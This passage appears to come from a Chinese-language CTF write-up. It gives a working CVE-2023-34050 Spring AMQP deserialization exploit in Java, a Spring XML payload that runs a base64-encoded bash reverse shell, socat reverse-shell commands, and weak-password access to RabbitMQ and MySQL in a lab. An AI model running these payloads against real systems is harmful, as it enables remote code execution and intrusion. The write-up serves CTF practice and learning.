                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span>-c<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span>echo x|base64 -d|bash -i<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span> 
                <span class="token comment">&lt;!-- x: "bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1" encoded with base64 --&gt;</span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>list</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>constructor-arg</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>beans</span><span class="token punctuation">&gt;</span></span></code></pre>
<p>é€šè¿‡ <code>/uploadFile</code> è·¯ç”±ä¸Šä¼  1.<span class="hexo-wm">ğ¬ï»¿ğŸ¯ğ’—ğ˜¦ğ§Â·â€‹sğ˜ªâ€â€‹ğ’•ï½…â€ï»¿</span>pebbleï¼Œå†é€šè¿‡ <code>/</code> è·¯ç”±è®¿é—®ä¸Šä¼ çš„ template æ¨¡æ¿ï¼Œè¿œç¨‹åŠ è½½ 1.xml å®ç° RCEï¼Œæœ€ååå¼¹ Shell è·å¾— flag</p>
<h1 id="Week3-ez-cfs"><a href="#Week3-ez-cfs" class="headerlink" title="Week3 - ez_cfs"></a>Week3 - ez_cfs</h1><h2 id="ç½‘ç»œæ‹“æ‰‘"><a href="#ç½‘ç»œæ‹“æ‰‘" class="headerlink" title="ç½‘ç»œæ‹“æ‰‘"></a>ç½‘ç»œæ‹“æ‰‘</h2><p><img src="image-10.png" alt="image-10.png"></p>
<h2 id="1-ez-cfs-part1"><a href="#1-ez-cfs-part1" class="headerlink" title="1. ez_cfs_part1"></a>1. ez_cfs_part1</h2><blockquote>
<p>å‡ºé¢˜æ€è·¯æ¥è‡ªï¼š<br><a href="https://exp10it.io/2023/10/spring-amqp-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2023-34050-%E5%88%86%E6%9E%90/">https://exp10it.io/2023/10/spring-amqp-ååºåˆ—åŒ–æ¼æ´-<span class="hexo-wm">sâ€‹â€Â³â…´â„¯ï½ï¼â€â€‹sâ…ˆâ€Œâ€ğ’•ğ˜¦â€Œ</span>cve-2023-34050-åˆ†æ/</a></p>
</blockquote>
<p>CVE-2023-34050ï¼š<span class="hexo-wm">ğ˜´ï»¿â€ŒÂ³ğ¯ï½…ğ’âˆ™â€‹â€Œğ˜´ï½‰ï»¿â€‹ğ’•ğï»¿</span>Spring AMQP ååºåˆ—åŒ–æ¼æ´</p>
<blockquote>
<p>æ ¹æ® Spring å®˜æ–¹é€šå‘Šçš„æè¿°, <span class="hexo-wm">ğ˜€â€â€‹ğŸ¯ğ’—ğ˜¦ï½â€¤ï»¿êœ±ï½‰â€ï»¿tğâ€â€</span>æ»¡è¶³ä»¥ä¸‹æ¡ä»¶æ—¶åˆ™å­˜åœ¨æ¼æ´</p>
<ul>
<li>ä½¿ç”¨ SimpleMessageConverter <span class="hexo-wm">ğ’”â€3vâ„®ğ§â€¤â€Œğ¬ğ¢â€Œâ€Œğ­ğâ€â€Œ</span>æˆ– SerializerMessageConverter (é»˜è®¤ä¸º SimpleMessageConverter)</li>
<li>å¼€å‘è€…æ²¡æœ‰é…ç½® <span class="hexo-wm">Ñ•â€‹3vğ˜¦nâ€¤â€‹â€Œêœ±iâ€‹ğ˜µï½…â€</span>allowed list patterns</li>
<li>æ”»å‡»è€…å¯ä»¥å‘ RabbitMQ æœåŠ¡å™¨çš„æŸä¸ª <span class="hexo-wm">sâ€Â³ğ˜·ğ˜¦ğ§â€¤â€‹Ñ•iâ€Œğ˜µâ„®â€ï»¿</span>Queue å†…å†™å…¥ Message <span class="hexo-wm">ğ’”ï»¿â€ŒÂ³â…´ï½…ğ˜¯.â€Œï»¿ğ¬ï½‰ï»¿â€‹ğ’•eâ€‹â€‹</span>(RabbitMQ æœªæˆæƒ/å¼±å£ä»¤/å¯é…ç½® RabbitMQ è¿æ¥å‚æ•°)</li>
<li>å¿…é¡»å¾—æœ‰å¯¹åº”çš„ Listener æ¥å¤„ç†æ¥æ”¶åˆ°çš„ <span class="hexo-wm">ğ˜´â€3ğ¯â„¯ğ§â€¤â€Œï»¿Ñ•ğ¢ï»¿â€Œğ­eâ€Œ</span>Message (ä½¿ç”¨ @RabbitListener æˆ– @RabbitHandler æ³¨è§£)</li>
</ul>
</blockquote>
<p>é¦–å…ˆæ˜¯çˆ†ç ´ RabbitMQ æœåŠ¡å™¨çš„å¼±å£ä»¤ï¼Œç®€å•å°è¯•åå¯ä»¥å¾—å‡ºæ˜¯ Test:654321<br>ç„¶åä½¿ç”¨ Jackson <span class="hexo-wm">ğ¬â€â‘¶ğ¯eï½Â·â€ğ˜€ğ¢â€Œğ’•ï½…â€Œâ€</span>åŸç”Ÿååºåˆ—åŒ– + TemplatesImpl</p>
<h3 id="1-1-Jackson-åŸç”Ÿååºåˆ—åŒ–é“¾"><a href="#1-1-Jackson-åŸç”Ÿååºåˆ—åŒ–é“¾" class="headerlink" title="1.1 Jackson åŸç”Ÿååºåˆ—åŒ–é“¾"></a>1.1 Jackson åŸç”Ÿååºåˆ—åŒ–é“¾</h3><p>Gadgets.java</p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">ClassPool</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtClass</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtConstructor</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Gadgets</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">TemplatesImpl</span> <span class="token function">createTemplatesImpl</span><span class="token punctuation">(</span><span class="token class-name">String</span> command<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
        <span class="token class-name">TemplatesImpl</span> templatesImpl <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ClassPool</span> pool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">String</span> body <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"{java.lang.Runtime.getRuntime().exec(\"%s\"); throw new org.springframework.amqp.AmqpRejectAndDontRequeueException(\"err\");}"</span><span class="token punctuation">,</span> command<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// åˆ©ç”¨ Javaassist åŠ¨æ€åˆ›å»º TemplatesImpl æ¶æ„ç±»</span>
        <span class="token class-name">CtClass</span> clazz <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"TemplatesEvilClass"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// è®¾ç½® Super Class ä¸º AbstractTranslet</span>
        <span class="token class-name">CtClass</span> superClazz <span class="token operator">=</span>pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        clazz<span class="token punctuation">.</span><span class="token function">setSuperclass</span><span class="token punctuation">(</span>superClazz<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// åˆ›å»ºæ— å‚ Constructor, å†™å…¥ Runtime.exec</span>
        <span class="token class-name">CtConstructor</span> constructor <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CtConstructor</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">CtClass</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> clazz<span class="token punctuation">)</span><span class="token punctuation">;</span>
        constructor<span class="token punctuation">.</span><span class="token function">setBody</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>
        clazz<span class="token punctuation">.</span><span class="token function">addConstructor</span><span class="token punctuation">(</span>constructor<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// å°† Runtime.exec ç›´æ¥å†™å…¥ static ä»£ç å—</span>
<span class="token comment">//        clazz.makeClassInitializer().setBody(body);</span>

        <span class="token class-name">Reflections</span><span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span> <span class="token string">"Hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Reflections</span><span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span> <span class="token string">"_bytecodes"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>clazz<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Reflections</span><span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">return</span> templatesImpl<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getByteCode</span><span class="token punctuation">(</span><span class="token class-name">Class</span> clazz<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
        <span class="token class-name">ClassPool</span> pool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">CtClass</span> c <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>clazz<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> c<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<p>Reflection<span class="hexo-wm">ğ’”â€Â³ğ˜·â„¯nâ€¤â€‹siâ€‹ğ’•ğâ€‹â€</span>s.java</p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Reflections</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setFieldValue</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token class-name">Object</span> val<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">{</span>
        <span class="token class-name">Field</span> f <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
        f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token function">invokeMethod</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> parameterTypes<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">{</span>
        <span class="token class-name">Method</span> m <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> parameterTypes<span class="token punctuation">)</span><span class="token punctuation">;</span>
        m<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> m<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<p>MessageContro<span class="hexo-wm">êœ±â€â‘¶â…´ï½…nâ€¤â€‹â€ŒÑ•â…ˆâ€‹â€Œğ’•ï½…â€Œâ€‹</span>ller.java</p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> sendPoc <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>

        <span class="token class-name">TemplatesImpl</span> templatesImpl <span class="token operator">=</span> <span class="token class-name">Gadgets</span><span class="token punctuation">.</span><span class="token function">createTemplatesImpl</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">AdvisedSupport</span> as <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AdvisedSupport</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        as<span class="token punctuation">.</span><span class="token function">setTarget</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Constructor</span> constructor <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"org.springframework.aop.framework.JdkDynamicAopProxy"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">AdvisedSupport</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">InvocationHandler</span> jdkDynamicAopProxyHandler <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">InvocationHandler</span><span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>as<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Templates</span> templatesProxy <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Templates</span><span class="token punctuation">)</span> <span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span><span class="token class-name">ClassLoader</span><span class="token punctuation">.</span><span class="token function">getSystemClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> jdkDynamicAopProxyHandler<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">POJONode</span> pojoNode <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">POJONode</span><span class="token punctuation">(</span>templatesProxy<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">BadAttributeValueExpException</span> poc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Reflections</span><span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>poc<span class="token punctuation">,</span> <span class="token string">"val"</span><span class="token punctuation">,</span> pojoNode<span class="token punctuation">)</span><span class="token punctuation">;</span>

        messageSenderService<span class="token punctuation">.</span><span class="token function">sendMessage</span><span class="token punctuation">(</span>poc<span class="token punctuation">)</span><span class="token punctuation">;</span>
        
<span class="token punctuation">}</span></code></pre>
<h3 id="1-2-æ³¨æ„ç‚¹ï¼š"><a href="#1-2-æ³¨æ„ç‚¹ï¼š" class="headerlink" title="1.2 æ³¨æ„ç‚¹ï¼š"></a>1.2 æ³¨æ„ç‚¹ï¼š</h3><h4 id="1-2-1-åˆ é™¤-BaseJsonNode-writeReplace"><a href="#1-2-1-åˆ é™¤-BaseJsonNode-writeReplace" class="headerlink" title="1.2.1 åˆ é™¤ BaseJsonNode.writeReplace"></a>1.2.1 åˆ é™¤ BaseJsonNode.writeReplace</h4><p>ä½¿ç”¨åŸæœ¬çš„ BaseJsonNode <span class="hexo-wm">ğ’”â€ŒÂ³ğ˜·ğ˜¦ï½Â·â€ğ’”ğ¢ï»¿ï»¿ğ˜µğâ€‹</span>çš„è¯ï¼Œåœ¨å‘é€æ¶ˆæ¯åºåˆ—åŒ–çš„æ—¶å€™ä¼šè°ƒç”¨ <code>BaseJsonNode.writeReplace()</code> ï¼Œæœ€åä¹Ÿä¼šè°ƒç”¨ <code>TemplatesImpl.getOutputProperties()</code> è§¦å‘å‘½ä»¤æ‰§è¡Œ</p>
<p>ä½†æ˜¯è¿™é‡Œè§¦å‘åä¼šæŠ¥é”™ <code>NullPointerException</code> ï¼Œå¯¼è‡´æ¶ˆæ¯ä¼ é€’ä¸­æ–­</p>
<p>åˆ é™¤æ‰ <code>BaseJsonNode.writeReplace()</code> å°±è°ƒç”¨çš„æ˜¯ <code>UnmodifiableRandomAccessList.writeReplace()</code> ï¼Œæ¶ˆæ¯èƒ½ç»§ç»­ä¼ é€’</p>
<h4 id="1-2-2-æŠ›å‡º-AmqpRejectAndDontRequeueException-å¼‚å¸¸"><a href="#1-2-2-æŠ›å‡º-AmqpRejectAndDontRequeueException-å¼‚å¸¸" class="headerlink" title="1.2.2 æŠ›å‡º AmqpRejectAndDontRequeueException å¼‚å¸¸"></a>1.2.2 æŠ›å‡º AmqpRejectAndDontRequeueException å¼‚å¸¸</h4><p>å› ä¸ºåœ¨æ‰§è¡Œ <code>Jackson</code> é“¾æ—¶å¿…ç„¶ä¼šå‡ºç°æŠ¥é”™ï¼Œå¯¼è‡´æ¶ˆæ¯å¤„ç†ä¸æˆåŠŸï¼Œ<span class="hexo-wm">ğ˜´ï»¿3ğ¯ğ˜¦ğ§âˆ™â€â€sï½‰â€â€Œğ’•eâ€â€</span>å°±ä¼šè®©æ¶ˆæ¯é‡æ–°æ’é˜Ÿå¤„ç†ï¼Œç„¶ååˆæŠ¥é”™ï¼Œé™·å…¥æ­»å¾ªç¯ã€‚</p>
<p>æŠ›å‡ºè¿™ä¸ªå¼‚å¸¸å¯ä»¥é¿å…æ— é™æ¬¡<span class="hexo-wm">sï»¿ğŸ¯vï½…ğ§Â·ï»¿êœ±â…ˆâ€‹â€ğ’•ğâ€Œ</span>åœ°é‡è¯•å¤±è´¥çš„æ¶ˆæ¯ï¼ŒèŠ‚çº¦ç³»ç»Ÿèµ„æºã€‚</p>
<h4 id="1-2-3-æ¶ˆæ¯æœªå¤„ç†ï¼Œåˆ é™¤é˜Ÿåˆ—"><a href="#1-2-3-æ¶ˆæ¯æœªå¤„ç†ï¼Œåˆ é™¤é˜Ÿåˆ—" class="headerlink" title="1.2.3 æ¶ˆæ¯æœªå¤„ç†ï¼Œåˆ é™¤é˜Ÿåˆ—"></a>1.2.3 æ¶ˆæ¯æœªå¤„ç†ï¼Œåˆ é™¤é˜Ÿåˆ—</h4><p>ç”±äºæ¶ˆæ¯å¤„ç†å¤±è´¥ï¼Œè¿˜æ˜¯ä¼šç•™å­˜åœ¨é˜Ÿä¸­ï¼Œå¤„äº <code>unacked</code> çŠ¶æ€ï¼Œå½“æµ‹è¯•ç¨‹åºå†æ¬¡å¯åŠ¨æ—¶ï¼Œ<span class="hexo-wm">ğ¬â€â€ŒÂ³ğ’—enâˆ™â€‹êœ±ï½‰ï»¿ğ˜µğâ€‹â€</span>å°±ä¼šä¼˜å…ˆå¤„ç†é˜Ÿåˆ—ä¸­ç•™å­˜æ¶ˆæ¯ã€‚</p>
<p>æ‰€ä»¥åœ¨å¤ç°è¿‡ç¨‹ä¸­å¦‚æœé˜Ÿåˆ—ä¸­è¿˜ç•™å­˜æœ‰ä¸Šä¸€æ¬¡æµ‹è¯•çš„æ¶ˆæ¯ï¼Œ<span class="hexo-wm">ğ’”â€Œâ€‹ğŸ¯ğ’—ï½…ğ’âˆ™ï»¿êœ±ğ¢â€‹ï»¿ğ­ï½…ï»¿â€Œ</span>å¯ä»¥æŠŠé˜Ÿåˆ—åˆ é™¤é‡æ–°åˆ›å»ºã€‚ </p>
<h2 id="2-ez-cfs-part2"><a href="#2-ez-cfs-part2" class="headerlink" title="2. ez_cfs_part2"></a>2. ez_cfs_part2</h2><p>æ¯”è¾ƒå…¸å‹çš„å†…ç½‘æ¨ªå‘æ¸—é€</p>
<h3 id="2-1-æ¢æŸ¥å†…ç½‘ç¯å¢ƒ"><a href="#2-1-æ¢æŸ¥å†…ç½‘ç¯å¢ƒ" class="headerlink" title="2.1 æ¢æŸ¥å†…ç½‘ç¯å¢ƒ"></a>2.1 æ¢æŸ¥å†…ç½‘ç¯å¢ƒ</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /etc/hosts</code></pre>
<p>å¯ä»¥çœ‹å‡º server å¤„äºä¸¤ä¸ªå†…ç½‘ Network ä¸­ï¼Œä½¿ç”¨ Nmap å¯¹ç›¸åº”å­æ®µè¿›è¡Œæ‰«æï¼Œå‘ç°å­˜åœ¨ä¸€å° MySQL å®¹å™¨<br>å¦‚æœç›´æ¥åœ¨åå¼¹çš„ Shell ä¸Šè°ƒç”¨ mysql-<span class="hexo-wm">ğ¬ï»¿â€‹ğŸ¯ğ˜·ï½…ğ’Â·â€‹ğ¬ï½‰â€‹tâ„®â€â€‹</span>client æ˜¯æ— æ³•æ­£å¸¸è¾“å…¥å¯†ç å’Œè¿æ¥çš„ï¼Œ<br>è¿™æ˜¯å› ä¸ºåå¼¹çš„ Shell ä¸€èˆ¬æ²¡æœ‰åˆ†é… tty</p>
<h3 id="2-2-åå¼¹-tty"><a href="#2-2-åå¼¹-tty" class="headerlink" title="2.2 åå¼¹ tty"></a>2.2 åå¼¹ tty</h3><p>ä½¿ç”¨ socat <span class="hexo-wm">ğ˜€â€Œï»¿â‘¶â…´â„®ï½.â€â€‹ğ¬â…ˆï»¿ğ­ï½…â€Œ</span>å·¥å…·å¯ä»¥åå¼¹ tty</p>
<p>socat_l<span class="hexo-wm">ğ¬â€‹ğŸ¯â…´eğ˜¯Â·â€Œâ€Œêœ±ï½‰â€‹â€‹tï½…ï»¿â€‹</span>isten.sh</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">socat file:<span class="token variable"><span class="token variable">`</span><span class="token function">tty</span><span class="token variable">`</span></span>,raw,echo<span class="token operator">=</span><span class="token number">0</span> tcp-listen:<span class="token operator">&lt;</span>listen_port<span class="token operator">&gt;</span></code></pre>
<p>socat_sh<span class="hexo-wm">êœ±â€â€‹â‘¶vğ˜¦ï½âˆ™â€Œğ˜€ï½‰â€‹â€Œğ’•ğ˜¦â€ï»¿</span>ell.sh</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">socat tcp:<span class="token operator">&lt;</span>server<span class="token operator">&gt;</span>:<span class="token operator">&lt;</span>listen_port<span class="token operator">&gt;</span> exec:<span class="token string">'bash -li'</span>,pty,stderr,setsid,sigint,sane</code></pre>
<p>åå¼¹ tty <span class="hexo-wm">Ñ•â€Œâ€ŒÂ³ğ’—â„®ğ§â€¢â€ŒÑ•ï½‰â€Œğ˜µâ„®â€â€‹</span>åå³å¯æ­£å¸¸è¿æ¥ MySQL</p>
<h3 id="2-3-è¿æ¥-MySQL"><a href="#2-3-è¿æ¥-MySQL" class="headerlink" title="2.3 è¿æ¥ MySQL"></a>2.3 è¿æ¥ MySQL</h3><pre class="language-bash" data-language="bash"><code class="language-bash">mysql <span class="token parameter variable">-h</span> <span class="token operator">&lt;</span>mysql_server_ip<span class="token operator">&gt;</span> <span class="token parameter variable">-u</span> root <span class="token parameter variable">-p</span></code></pre>
<p>ç®€å•å°è¯•å‘ç°å£ä»¤ä¸º <code>root:root</code> ï¼Œ<br>ç™»å½•åå³å¯åœ¨ ctf <span class="hexo-wm">ğ˜´â€‹Â³vğ˜¦ğ’Â·â€Œsï½‰ï»¿ï»¿ğ˜µï½…â€ï»¿</span>æ•°æ®åº“çš„ flag è¡¨ä¸­è·å¾— flag_2</p>
<blockquote>
<p>PSï¼šç”±äºé¶æœºç¯å¢ƒå¯ä»¥è”ç½‘ï¼Œ<span class="hexo-wm">ğ˜´â€Œï»¿ğŸ¯â…´ğğ’â€¢â€‹ï»¿ğ¬ğ˜ªï»¿ğ˜µeï»¿</span>æœ¬é¢˜ä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–å¯ç”¨äºè¿æ¥ MySQL ä¸”æ— éœ€ tty å³å¯è¿›è¡Œäº¤äº’çš„å·¥å…·å®Œæˆ</p>
</blockquote>
<h2 id="3-ez-cfs-part3"><a href="#3-ez-cfs-part3" class="headerlink" title="3. ez_cfs_part3"></a>3. ez_cfs_part3</h2><blockquote>
<p>åŸé¢˜æ˜¯ 2023 N1CTF lolita <span class="hexo-wm">ğ˜´â€‹ğŸ¯ğ’—eğ˜¯Â·â€Œï»¿ğ˜€iâ€ğ˜µâ„®â€‹</span>å‡ºçš„ ez_maria<br>æœ¬é¢˜ä½¿ç”¨äº† ProxySQL æ›¿ä»£äº†åŸé¢˜çš„ PHP preg_match ä½œä¸º waf ï¼Œå…¶æœ¬è´¨å’Œè§£é¢˜è¿‡ç¨‹è¿˜æ˜¯ä¸€æ ·çš„</p>
</blockquote>
<p>ç®€å•å°è¯•åå‘ç° mysql è¿‡æ»¤äº†ä¸€éƒ¨åˆ†å…³é”®è¯ï¼Œ<span class="hexo-wm">sâ€â€3â…´enâ€¤â€Œsğ¢ï»¿â€‹ğ’•ğ˜¦â€</span>è¿™é‡Œä½¿ç”¨åŠ è½½ shell æ’ä»¶æ¥åå¼¹ shell</p>
